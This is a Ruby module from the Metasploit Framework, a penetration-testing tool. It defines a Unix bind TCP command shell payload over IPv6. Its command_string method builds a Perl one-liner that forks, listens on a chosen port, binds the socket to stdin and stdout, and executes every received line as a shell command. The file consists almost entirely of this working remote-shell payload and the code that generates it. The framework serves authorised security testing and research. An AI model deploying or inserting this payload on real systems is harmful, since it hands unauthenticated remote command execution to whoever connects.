##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 152

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (via perl) IPv6',
        'Description' => 'Listen for a connection and spawn a command shell via perl',
        'Author' => ['Samy <samy[at]samy.pl>', 'cazz'],
        'License' => BSD_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'perl',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = "#{datastore['PerlPath']} -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"

    return cmd
  end
end
